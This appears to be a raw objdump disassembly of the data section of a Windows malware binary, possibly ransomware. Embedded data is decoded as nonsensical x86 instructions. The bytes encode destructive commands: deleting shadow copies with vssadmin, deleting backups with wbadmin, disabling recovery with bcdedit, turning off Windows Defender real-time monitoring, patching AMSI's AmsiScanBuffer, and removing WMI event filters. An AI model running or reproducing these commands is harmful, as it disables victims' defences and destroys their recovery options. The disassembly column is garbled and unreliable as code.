  4090bb:	4b 65 
  4090bd:	79 00                	jns    0x4090bf
  4090bf:	67 65 74 5f          	addr16 gs je 0x409122
  4090c3:	41                   	inc    %ecx
  4090c4:	64 64 72 65          	fs fs jb 0x40912d
  4090c8:	73 73                	jae    0x40913d
  4090ca:	46                   	inc    %esi
  4090cb:	61                   	popa
  4090cc:	6d                   	insl   (%dx),%es:(%edi)
  4090cd:	69 6c 79 00 50 69 6e 	imul   $0x676e6950,0x0(%ecx,%edi,2),%ebp
  4090d4:	67 
  4090d5:	52                   	push   %edx
  4090d6:	65 70 6c             	gs jo  0x409145
  4090d9:	79 00                	jns    0x4090db
  4090db:	41                   	inc    %ecx
  4090dc:	70 70                	jo     0x40914e
  4090de:	6c                   	insb   (%dx),%es:(%edi)
  4090df:	79 00                	jns    0x4090e1
  4090e1:	57                   	push   %edi
  4090e2:	68 65 6e 41 6e       	push   $0x6e416e65
  4090e7:	79 00                	jns    0x4090e9
  4090e9:	43                   	inc    %ebx
  4090ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4090eb:	70 79                	jo     0x409166
  4090ed:	00 4c 6f 61          	add    %cl,0x61(%edi,%ebp,2)
  4090f1:	64 4c                	fs dec %esp
  4090f3:	69 62 72 61 72 79 00 	imul   $0x797261,0x72(%edx),%esp
  4090fa:	41                   	inc    %ecx
  4090fb:	6e                   	outsb  %ds:(%esi),(%dx)
  4090fc:	74 69                	je     0x409167
  4090fe:	52                   	push   %edx
  4090ff:	65 63 6f 76          	arpl   %ebp,%gs:0x76(%edi)
  409103:	65 72 79             	gs jb  0x40917f
  409106:	00 57 72             	add    %dl,0x72(%edi)
  409109:	69 74 65 50 72 6f 63 	imul   $0x65636f72,0x50(%ebp,%eiz,2),%esi
  409110:	65 
  409111:	73 73                	jae    0x409186
  409113:	4d                   	dec    %ebp
  409114:	65 6d                	gs insl (%dx),%es:(%edi)
  409116:	6f                   	outsl  %ds:(%esi),(%dx)
  409117:	72 79                	jb     0x409192
  409119:	00 67 65             	add    %ah,0x65(%edi)
  40911c:	74 5f                	je     0x40917d
  40911e:	53                   	push   %ebx
  40911f:	79 73                	jns    0x409194
  409121:	74 65                	je     0x409188
  409123:	6d                   	insl   (%dx),%es:(%edi)
  409124:	44                   	inc    %esp
  409125:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  40912c:	79 00                	jns    0x40912e
  40912e:	67 65 74 5f          	addr16 gs je 0x409191
  409132:	52                   	push   %edx
  409133:	6f                   	outsl  %ds:(%esi),(%dx)
  409134:	6f                   	outsl  %ds:(%esi),(%dx)
  409135:	74 44                	je     0x40917b
  409137:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  40913e:	79 00                	jns    0x409140
  409140:	49                   	dec    %ecx
  409141:	50                   	push   %eax
  409142:	48                   	dec    %eax
  409143:	6f                   	outsl  %ds:(%esi),(%dx)
  409144:	73 74                	jae    0x4091ba
  409146:	45                   	inc    %ebp
  409147:	6e                   	outsb  %ds:(%esi),(%dx)
  409148:	74 72                	je     0x4091bc
  40914a:	79 00                	jns    0x40914c
  40914c:	47                   	inc    %edi
  40914d:	65 74 48             	gs je  0x409198
  409150:	6f                   	outsl  %ds:(%esi),(%dx)
  409151:	73 74                	jae    0x4091c7
  409153:	45                   	inc    %ebp
  409154:	6e                   	outsb  %ds:(%esi),(%dx)
  409155:	74 72                	je     0x4091c9
  409157:	79 00                	jns    0x409159
  409159:	55                   	push   %ebp
  40915a:	70 64                	jo     0x4091c0
  40915c:	61                   	popa
  40915d:	74 65                	je     0x4091c4
  40915f:	52                   	push   %edx
  409160:	65 67 69 73 74 72 79 	imul   $0x6f007972,%gs:0x74(%bp,%di),%esi
  409167:	00 6f 
  409169:	70 5f                	jo     0x4091ca
  40916b:	45                   	inc    %ebp
  40916c:	71 75                	jno    0x4091e3
  40916e:	61                   	popa
  40916f:	6c                   	insb   (%dx),%es:(%edi)
  409170:	69 74 79 00 53 79 73 	imul   $0x74737953,0x0(%ecx,%edi,2),%esi
  409177:	74 
  409178:	65 6d                	gs insl (%dx),%es:(%edi)
  40917a:	2e 53                	cs push %ebx
  40917c:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409180:	69 74 79 00 57 69 6e 	imul   $0x646e6957,0x0(%ecx,%edi,2),%esi
  409187:	64 
  409188:	6f                   	outsl  %ds:(%esi),(%dx)
  409189:	77 73                	ja     0x4091fe
  40918b:	49                   	dec    %ecx
  40918c:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  40918f:	74 69                	je     0x4091fa
  409191:	74 79                	je     0x40920c
  409193:	00 49 73             	add    %cl,0x73(%ecx)
  409196:	4e                   	dec    %esi
  409197:	75 6c                	jne    0x409205
  409199:	6c                   	insb   (%dx),%es:(%edi)
  40919a:	4f                   	dec    %edi
  40919b:	72 45                	jb     0x4091e2
  40919d:	6d                   	insl   (%dx),%es:(%edi)
  40919e:	70 74                	jo     0x409214
  4091a0:	79 00                	jns    0x4091a2
  4091a2:	00 00                	add    %al,(%eax)
  4091a4:	00 59 53             	add    %bl,0x53(%ecx)
  4091a7:	00 4f 00             	add    %cl,0x0(%edi)
  4091aa:	46                   	inc    %esi
  4091ab:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  4091af:	00 41 00             	add    %al,0x0(%ecx)
  4091b2:	52                   	push   %edx
  4091b3:	00 45 00             	add    %al,0x0(%ebp)
  4091b6:	5c                   	pop    %esp
  4091b7:	00 50 00             	add    %dl,0x0(%eax)
  4091ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4091bb:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  4091bf:	00 63 00             	add    %ah,0x0(%ebx)
  4091c2:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  4091c8:	5c                   	pop    %esp
  4091c9:	00 4d 00             	add    %cl,0x0(%ebp)
  4091cc:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  4091d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4091d3:	00 73 00             	add    %dh,0x0(%ebx)
  4091d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4091d7:	00 66 00             	add    %ah,0x0(%esi)
  4091da:	74 00                	je     0x4091dc
  4091dc:	5c                   	pop    %esp
  4091dd:	00 57 00             	add    %dl,0x0(%edi)
  4091e0:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  4091e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4091e7:	00 77 00             	add    %dh,0x0(%edi)
  4091ea:	73 00                	jae    0x4091ec
  4091ec:	20 00                	and    %al,(%eax)
  4091ee:	44                   	inc    %esp
  4091ef:	00 65 00             	add    %ah,0x0(%ebp)
  4091f2:	66 00 65 00          	data16 add %ah,0x0(%ebp)
  4091f6:	6e                   	outsb  %ds:(%esi),(%dx)
  4091f7:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  4091fb:	00 72 00             	add    %dh,0x0(%edx)
  4091fe:	00 25 44 00 69 00    	add    %ah,0x690044
  409204:	73 00                	jae    0x409206
  409206:	61                   	popa
  409207:	00 62 00             	add    %ah,0x0(%edx)
  40920a:	6c                   	insb   (%dx),%es:(%edi)
  40920b:	00 65 00             	add    %ah,0x0(%ebp)
  40920e:	41                   	inc    %ecx
  40920f:	00 6e 00             	add    %ch,0x0(%esi)
  409212:	74 00                	je     0x409214
  409214:	69 00 53 00 70 00    	imul   $0x700053,(%eax),%eax
  40921a:	79 00                	jns    0x40921c
  40921c:	77 00                	ja     0x40921e
  40921e:	61                   	popa
  40921f:	00 72 00             	add    %dh,0x0(%edx)
  409222:	65 00 00             	add    %al,%gs:(%eax)
  409225:	80 83 53 00 4f 00 46 	addb   $0x46,0x4f0053(%ebx)
  40922c:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  409230:	00 41 00             	add    %al,0x0(%ecx)
  409233:	52                   	push   %edx
  409234:	00 45 00             	add    %al,0x0(%ebp)
  409237:	5c                   	pop    %esp
  409238:	00 50 00             	add    %dl,0x0(%eax)
  40923b:	6f                   	outsl  %ds:(%esi),(%dx)
  40923c:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  409240:	00 63 00             	add    %ah,0x0(%ebx)
  409243:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  409249:	5c                   	pop    %esp
  40924a:	00 4d 00             	add    %cl,0x0(%ebp)
  40924d:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  409253:	6f                   	outsl  %ds:(%esi),(%dx)
  409254:	00 73 00             	add    %dh,0x0(%ebx)
  409257:	6f                   	outsl  %ds:(%esi),(%dx)
  409258:	00 66 00             	add    %ah,0x0(%esi)
  40925b:	74 00                	je     0x40925d
  40925d:	5c                   	pop    %esp
  40925e:	00 57 00             	add    %dl,0x0(%edi)
  409261:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  409267:	6f                   	outsl  %ds:(%esi),(%dx)
  409268:	00 77 00             	add    %dh,0x0(%edi)
  40926b:	73 00                	jae    0x40926d
  40926d:	20 00                	and    %al,(%eax)
  40926f:	44                   	inc    %esp
  409270:	00 65 00             	add    %ah,0x0(%ebp)
  409273:	66 00 65 00          	data16 add %ah,0x0(%ebp)
  409277:	6e                   	outsb  %ds:(%esi),(%dx)
  409278:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40927c:	00 72 00             	add    %dh,0x0(%edx)
  40927f:	5c                   	pop    %esp
  409280:	00 52 00             	add    %dl,0x0(%edx)
  409283:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  409287:	6c                   	insb   (%dx),%es:(%edi)
  409288:	00 2d 00 54 00 69    	add    %ch,0x69005400
  40928e:	00 6d 00             	add    %ch,0x0(%ebp)
  409291:	65 00 20             	add    %ah,%gs:(%eax)
  409294:	00 50 00             	add    %dl,0x0(%eax)
  409297:	72 00                	jb     0x409299
  409299:	6f                   	outsl  %ds:(%esi),(%dx)
  40929a:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40929e:	00 63 00             	add    %ah,0x0(%ebx)
  4092a1:	74 00                	je     0x4092a3
  4092a3:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  4092a9:	01 33                	add    %esi,(%ebx)
  4092ab:	44                   	inc    %esp
  4092ac:	00 69 00             	add    %ch,0x0(%ecx)
  4092af:	73 00                	jae    0x4092b1
  4092b1:	61                   	popa
  4092b2:	00 62 00             	add    %ah,0x0(%edx)
  4092b5:	6c                   	insb   (%dx),%es:(%edi)
  4092b6:	00 65 00             	add    %ah,0x0(%ebp)
  4092b9:	42                   	inc    %edx
  4092ba:	00 65 00             	add    %ah,0x0(%ebp)
  4092bd:	68 00 61 00 76       	push   $0x76006100
  4092c2:	00 69 00             	add    %ch,0x0(%ecx)
  4092c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4092c6:	00 72 00             	add    %dh,0x0(%edx)
  4092c9:	4d                   	dec    %ebp
  4092ca:	00 6f 00             	add    %ch,0x0(%edi)
  4092cd:	6e                   	outsb  %ds:(%esi),(%dx)
  4092ce:	00 69 00             	add    %ch,0x0(%ecx)
  4092d1:	74 00                	je     0x4092d3
  4092d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4092d4:	00 72 00             	add    %dh,0x0(%edx)
  4092d7:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  4092dd:	00 33                	add    %dh,(%ebx)
  4092df:	44                   	inc    %esp
  4092e0:	00 69 00             	add    %ch,0x0(%ecx)
  4092e3:	73 00                	jae    0x4092e5
  4092e5:	61                   	popa
  4092e6:	00 62 00             	add    %ah,0x0(%edx)
  4092e9:	6c                   	insb   (%dx),%es:(%edi)
  4092ea:	00 65 00             	add    %ah,0x0(%ebp)
  4092ed:	4f                   	dec    %edi
  4092ee:	00 6e 00             	add    %ch,0x0(%esi)
  4092f1:	41                   	inc    %ecx
  4092f2:	00 63 00             	add    %ah,0x0(%ebx)
  4092f5:	63 00                	arpl   %eax,(%eax)
  4092f7:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  4092fb:	73 00                	jae    0x4092fd
  4092fd:	50                   	push   %eax
  4092fe:	00 72 00             	add    %dh,0x0(%edx)
  409301:	6f                   	outsl  %ds:(%esi),(%dx)
  409302:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  409306:	00 63 00             	add    %ah,0x0(%ebx)
  409309:	74 00                	je     0x40930b
  40930b:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  409311:	00 37                	add    %dh,(%edi)
  409313:	44                   	inc    %esp
  409314:	00 69 00             	add    %ch,0x0(%ecx)
  409317:	73 00                	jae    0x409319
  409319:	61                   	popa
  40931a:	00 62 00             	add    %ah,0x0(%edx)
  40931d:	6c                   	insb   (%dx),%es:(%edi)
  40931e:	00 65 00             	add    %ah,0x0(%ebp)
  409321:	53                   	push   %ebx
  409322:	00 63 00             	add    %ah,0x0(%ebx)
  409325:	61                   	popa
  409326:	00 6e 00             	add    %ch,0x0(%esi)
  409329:	4f                   	dec    %edi
  40932a:	00 6e 00             	add    %ch,0x0(%esi)
  40932d:	52                   	push   %edx
  40932e:	00 65 00             	add    %ah,0x0(%ebp)
  409331:	61                   	popa
  409332:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
  409336:	00 69 00             	add    %ch,0x0(%ecx)
  409339:	6d                   	insl   (%dx),%es:(%edi)
  40933a:	00 65 00             	add    %ah,0x0(%ebp)
  40933d:	45                   	inc    %ebp
  40933e:	00 6e 00             	add    %ch,0x0(%esi)
  409341:	61                   	popa
  409342:	00 62 00             	add    %ah,0x0(%edx)
  409345:	6c                   	insb   (%dx),%es:(%edi)
  409346:	00 65 00             	add    %ah,0x0(%ebp)
  409349:	00 15 70 00 6f 00    	add    %dl,0x6f0070
  40934f:	77 00                	ja     0x409351
  409351:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409355:	73 00                	jae    0x409357
  409357:	68 00 65 00 6c       	push   $0x6c006500
  40935c:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  409360:	63 53 00             	arpl   %edx,0x0(%ebx)
  409363:	65 00 74 00 2d       	add    %dh,%gs:0x2d(%eax,%eax,1)
  409368:	00 4d 00             	add    %cl,0x0(%ebp)
  40936b:	70 00                	jo     0x40936d
  40936d:	50                   	push   %eax
  40936e:	00 72 00             	add    %dh,0x0(%edx)
  409371:	65 00 66 00          	add    %ah,%gs:0x0(%esi)
  409375:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409379:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40937d:	63 00                	arpl   %eax,(%eax)
  40937f:	65 00 20             	add    %ah,%gs:(%eax)
  409382:	00 2d 00 44 00 69    	add    %ch,0x69004400
  409388:	00 73 00             	add    %dh,0x0(%ebx)
  40938b:	61                   	popa
  40938c:	00 62 00             	add    %ah,0x0(%edx)
  40938f:	6c                   	insb   (%dx),%es:(%edi)
  409390:	00 65 00             	add    %ah,0x0(%ebp)
  409393:	52                   	push   %edx
  409394:	00 65 00             	add    %ah,0x0(%ebp)
  409397:	61                   	popa
  409398:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
  40939c:	00 69 00             	add    %ch,0x0(%ecx)
  40939f:	6d                   	insl   (%dx),%es:(%edi)
  4093a0:	00 65 00             	add    %ah,0x0(%ebp)
  4093a3:	4d                   	dec    %ebp
  4093a4:	00 6f 00             	add    %ch,0x0(%edi)
  4093a7:	6e                   	outsb  %ds:(%esi),(%dx)
  4093a8:	00 69 00             	add    %ch,0x0(%ecx)
  4093ab:	74 00                	je     0x4093ad
  4093ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4093ae:	00 72 00             	add    %dh,0x0(%edx)
  4093b1:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  4093b7:	20 00                	and    %al,(%eax)
  4093b9:	24 00                	and    $0x0,%al
  4093bb:	74 00                	je     0x4093bd
  4093bd:	72 00                	jb     0x4093bf
  4093bf:	75 00                	jne    0x4093c1
  4093c1:	65 00 01             	add    %al,%gs:(%ecx)
  4093c4:	0f 63 00             	packsswb (%eax),%mm0
  4093c7:	6d                   	insl   (%dx),%es:(%edi)
  4093c8:	00 64 00 2e          	add    %ah,0x2e(%eax,%eax,1)
  4093cc:	00 65 00             	add    %ah,0x0(%ebp)
  4093cf:	78 00                	js     0x4093d1
  4093d1:	65 00 00             	add    %al,%gs:(%eax)
  4093d4:	4d                   	dec    %ebp
  4093d5:	2f                   	das
  4093d6:	00 63 00             	add    %ah,0x0(%ebx)
  4093d9:	20 00                	and    %al,(%eax)
  4093db:	76 00                	jbe    0x4093dd
  4093dd:	73 00                	jae    0x4093df
  4093df:	73 00                	jae    0x4093e1
  4093e1:	61                   	popa
  4093e2:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  4093e6:	00 69 00             	add    %ch,0x0(%ecx)
  4093e9:	6e                   	outsb  %ds:(%esi),(%dx)
  4093ea:	00 20                	add    %ah,(%eax)
  4093ec:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  4093f0:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  4093f4:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  4093f8:	00 20                	add    %ah,(%eax)
  4093fa:	00 73 00             	add    %dh,0x0(%ebx)
  4093fd:	68 00 61 00 64       	push   $0x64006100
  409402:	00 6f 00             	add    %ch,0x0(%edi)
  409405:	77 00                	ja     0x409407
  409407:	73 00                	jae    0x409409
  409409:	20 00                	and    %al,(%eax)
  40940b:	2f                   	das
  40940c:	00 61 00             	add    %ah,0x0(%ecx)
  40940f:	6c                   	insb   (%dx),%es:(%edi)
  409410:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  409414:	00 2f                	add    %ch,(%edi)
  409416:	00 71 00             	add    %dh,0x0(%ecx)
  409419:	75 00                	jne    0x40941b
  40941b:	69 00 65 00 74 00    	imul   $0x740065,(%eax),%eax
  409421:	00 11                	add    %dl,(%ecx)
  409423:	61                   	popa
  409424:	00 6d 00             	add    %ch,0x0(%ebp)
  409427:	73 00                	jae    0x409429
  409429:	69 00 2e 00 64 00    	imul   $0x64002e,(%eax),%eax
  40942f:	6c                   	insb   (%dx),%es:(%edi)
  409430:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  409434:	1d 41 00 6d 00       	sbb    $0x6d0041,%eax
  409439:	73 00                	jae    0x40943b
  40943b:	69 00 53 00 63 00    	imul   $0x630053,(%eax),%eax
  409441:	61                   	popa
  409442:	00 6e 00             	add    %ch,0x0(%esi)
  409445:	42                   	inc    %edx
  409446:	00 75 00             	add    %dh,0x0(%ebp)
  409449:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40944d:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409451:	00 67 2f             	add    %ah,0x2f(%edi)
  409454:	00 63 00             	add    %ah,0x0(%ebx)
  409457:	20 00                	and    %al,(%eax)
  409459:	77 00                	ja     0x40945b
  40945b:	62 00                	bound  %eax,(%eax)
  40945d:	61                   	popa
  40945e:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  409462:	00 69 00             	add    %ch,0x0(%ecx)
  409465:	6e                   	outsb  %ds:(%esi),(%dx)
  409466:	00 20                	add    %ah,(%eax)
  409468:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40946c:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  409470:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  409474:	00 20                	add    %ah,(%eax)
  409476:	00 73 00             	add    %dh,0x0(%ebx)
  409479:	79 00                	jns    0x40947b
  40947b:	73 00                	jae    0x40947d
  40947d:	74 00                	je     0x40947f
  40947f:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  409483:	73 00                	jae    0x409485
  409485:	74 00                	je     0x409487
  409487:	61                   	popa
  409488:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40948c:	00 62 00             	add    %ah,0x0(%edx)
  40948f:	61                   	popa
  409490:	00 63 00             	add    %ah,0x0(%ebx)
  409493:	6b 00 75             	imul   $0x75,(%eax),%eax
  409496:	00 70 00             	add    %dh,0x0(%eax)
  409499:	20 00                	and    %al,(%eax)
  40949b:	2d 00 6b 00 65       	sub    $0x65006b00,%eax
  4094a0:	00 65 00             	add    %ah,0x0(%ebp)
  4094a3:	70 00                	jo     0x4094a5
  4094a5:	76 00                	jbe    0x4094a7
  4094a7:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4094ab:	73 00                	jae    0x4094ad
  4094ad:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  4094b3:	73 00                	jae    0x4094b5
  4094b5:	3a 00                	cmp    (%eax),%al
  4094b7:	30 00                	xor    %al,(%eax)
  4094b9:	01 59 2f             	add    %ebx,0x2f(%ecx)
  4094bc:	00 63 00             	add    %ah,0x0(%ebx)
  4094bf:	20 00                	and    %al,(%eax)
  4094c1:	62 00                	bound  %eax,(%eax)
  4094c3:	63 00                	arpl   %eax,(%eax)
  4094c5:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  4094c9:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  4094cd:	74 00                	je     0x4094cf
  4094cf:	20 00                	and    %al,(%eax)
  4094d1:	2f                   	das
  4094d2:	00 73 00             	add    %dh,0x0(%ebx)
  4094d5:	65 00 74 00 20       	add    %dh,%gs:0x20(%eax,%eax,1)
  4094da:	00 7b 00             	add    %bh,0x0(%ebx)
  4094dd:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  4094e1:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  4094e5:	75 00                	jne    0x4094e7
  4094e7:	6c                   	insb   (%dx),%es:(%edi)
  4094e8:	00 74 00 7d          	add    %dh,0x7d(%eax,%eax,1)
  4094ec:	00 20                	add    %ah,(%eax)
  4094ee:	00 72 00             	add    %dh,0x0(%edx)
  4094f1:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  4094f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4094f6:	00 76 00             	add    %dh,0x0(%esi)
  4094f9:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4094fd:	79 00                	jns    0x4094ff
  4094ff:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  409503:	61                   	popa
  409504:	00 62 00             	add    %ah,0x0(%edx)
  409507:	6c                   	insb   (%dx),%es:(%edi)
  409508:	00 65 00             	add    %ah,0x0(%ebp)
  40950b:	64 00 20             	add    %ah,%fs:(%eax)
  40950e:	00 4e 00             	add    %cl,0x0(%esi)
  409511:	6f                   	outsl  %ds:(%esi),(%dx)
  409512:	00 00                	add    %al,(%eax)
  409514:	1b 43 00             	sbb    0x0(%ebx),%eax
  409517:	3a 00                	cmp    (%eax),%al
  409519:	5c                   	pop    %esp
  40951a:	00 6b 00             	add    %ch,0x0(%ebx)
  40951d:	69 00 6c 00 6c 00    	imul   $0x6c006c,(%eax),%eax
  409523:	6d                   	insl   (%dx),%es:(%edi)
  409524:	00 65 00             	add    %ah,0x0(%ebp)
  409527:	2e 00 6b 00          	add    %ch,%cs:0x0(%ebx)
  40952b:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  40952f:	00 80 81 2f 00 63    	add    %al,0x63002f81(%eax)
  409535:	00 20                	add    %ah,(%eax)
  409537:	00 77 00             	add    %dh,0x0(%edi)
  40953a:	6d                   	insl   (%dx),%es:(%edi)
  40953b:	00 69 00             	add    %ch,0x0(%ecx)
  40953e:	63 00                	arpl   %eax,(%eax)
  409540:	20 00                	and    %al,(%eax)
  409542:	2f                   	das
  409543:	00 6e 00             	add    %ch,0x0(%esi)
  409546:	61                   	popa
  409547:	00 6d 00             	add    %ch,0x0(%ebp)
  40954a:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40954e:	70 00                	jo     0x409550
  409550:	61                   	popa
  409551:	00 63 00             	add    %ah,0x0(%ebx)
  409554:	65 00 3a             	add    %bh,%gs:(%edx)
  409557:	00 5c 00 5c          	add    %bl,0x5c(%eax,%eax,1)
  40955b:	00 72 00             	add    %dh,0x0(%edx)
  40955e:	6f                   	outsl  %ds:(%esi),(%dx)
  40955f:	00 6f 00             	add    %ch,0x0(%edi)
  409562:	74 00                	je     0x409564
  409564:	5c                   	pop    %esp
  409565:	00 73 00             	add    %dh,0x0(%ebx)
  409568:	75 00                	jne    0x40956a
  40956a:	62 00                	bound  %eax,(%eax)
  40956c:	73 00                	jae    0x40956e
  40956e:	63 00                	arpl   %eax,(%eax)
  409570:	72 00                	jb     0x409572
  409572:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  409578:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40957e:	20 00                	and    %al,(%eax)
  409580:	50                   	push   %eax
  409581:	00 41 00             	add    %al,0x0(%ecx)
  409584:	54                   	push   %esp
  409585:	00 48 00             	add    %cl,0x0(%eax)
  409588:	20 00                	and    %al,(%eax)
  40958a:	5f                   	pop    %edi
  40958b:	00 5f 00             	add    %bl,0x0(%edi)
  40958e:	45                   	inc    %ebp
  40958f:	00 76 00             	add    %dh,0x0(%esi)
  409592:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  409596:	74 00                	je     0x409598
  409598:	46                   	inc    %esi
  409599:	00 69 00             	add    %ch,0x0(%ecx)
  40959c:	6c                   	insb   (%dx),%es:(%edi)
  40959d:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  4095a1:	00 72 00             	add    %dh,0x0(%edx)
  4095a4:	20 00                	and    %al,(%eax)
  4095a6:	44                   	inc    %esp
  4095a7:	00 45 00             	add    %al,0x0(%ebp)
  4095aa:	4c                   	dec    %esp
  4095ab:	00 45 00             	add    %al,0x0(%ebp)
  4095ae:	54                   	push   %esp
  4095af:	00 45 00             	add    %al,0x0(%ebp)
  4095b2:	00 80 97 2f 00 63    	add    %al,0x63002f97(%eax)
  4095b8:	00 20                	add    %ah,(%eax)
  4095ba:	00 77 00             	add    %dh,0x0(%edi)
  4095bd:	6d                   	insl   (%dx),%es:(%edi)
  4095be:	00 69 00             	add    %ch,0x0(%ecx)
  4095c1:	63 00                	arpl   %eax,(%eax)
  4095c3:	20 00                	and    %al,(%eax)
  4095c5:	2f                   	das
  4095c6:	00 6e 00             	add    %ch,0x0(%esi)
  4095c9:	61                   	popa
  4095ca:	00 6d 00             	add    %ch,0x0(%ebp)
  4095cd:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  4095d1:	70 00                	jo     0x4095d3
  4095d3:	61                   	popa
  4095d4:	00 63 00             	add    %ah,0x0(%ebx)
  4095d7:	65 00 3a             	add    %bh,%gs:(%edx)
  4095da:	00 5c 00 5c          	add    %bl,0x5c(%eax,%eax,1)
  4095de:	00 72 00             	add    %dh,0x0(%edx)
  4095e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4095e2:	00 6f 00             	add    %ch,0x0(%edi)
  4095e5:	74 00                	je     0x4095e7
  4095e7:	5c                   	pop    %esp
  4095e8:	00 73 00             	add    %dh,0x0(%ebx)
  4095eb:	75 00                	jne    0x4095ed
  4095ed:	62 00                	bound  %eax,(%eax)
  4095ef:	73 00                	jae    0x4095f1
  4095f1:	63 00                	arpl   %eax,(%eax)
  4095f3:	72 00                	jb     0x4095f5
  4095f5:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  4095fb:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  409601:	20 00                	and    %al,(%eax)
  409603:	50                   	push   %eax
  409604:	00 41 00             	add    %al,0x0(%ecx)
  409607:	54                   	push   %esp
  409608:	00 48 00             	add    %cl,0x0(%eax)
  40960b:	20 00                	and    %al,(%eax)
  40960d:	43                   	inc    %ebx
  40960e:	00 6f 00             	add    %ch,0x0(%edi)
  409611:	6d                   	insl   (%dx),%es:(%edi)
  409612:	00 6d 00             	add    %ch,0x0(%ebp)
  409615:	61                   	popa
  409616:	00 6e 00             	add    %ch,0x0(%esi)
  409619:	64 00 4c 00 69       	add    %cl,%fs:0x69(%eax,%eax,1)
  40961e:	00 6e 00             	add    %ch,0x0(%esi)
  409621:	65 00 45 00          	add    %al,%gs:0x0(%ebp)
  409625:	76 00                	jbe    0x409627
  409627:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40962b:	74 00                	je     0x40962d
  40962d:	43                   	inc    %ebx
  40962e:	00 6f 00             	add    %ch,0x0(%edi)
  409631:	6e                   	outsb  %ds:(%esi),(%dx)
  409632:	00 73 00             	add    %dh,0x0(%ebx)
  409635:	75 00                	jne    0x409637
  409637:	6d                   	insl   (%dx),%es:(%edi)
  409638:	00 65 00             	add    %ah,0x0(%ebp)
  40963b:	72 00                	jb     0x40963d
  40963d:	20 00                	and    %al,(%eax)
  40963f:	44                   	inc    %esp
  409640:	00 45 00             	add    %al,0x0(%ebp)
  409643:	4c                   	dec    %esp
  409644:	00 45 00             	add    %al,0x0(%ebp)
  409647:	54                   	push   %esp
  409648:	00 45 00             	add    %al,0x0(%ebp)
  40964b:	00 80 99 2f 00 63    	add    %al,0x63002f99(%eax)
  409651:	00 20                	add    %ah,(%eax)
  409653:	00 77 00             	add    %dh,0x0(%edi)
  409656:	6d                   	insl   (%dx),%es:(%edi)
  409657:	00 69 00             	add    %ch,0x0(%ecx)
  40965a:	63 00                	arpl   %eax,(%eax)
  40965c:	20 00                	and    %al,(%eax)
  40965e:	2f                   	das
  40965f:	00 6e 00             	add    %ch,0x0(%esi)
  409662:	61                   	popa
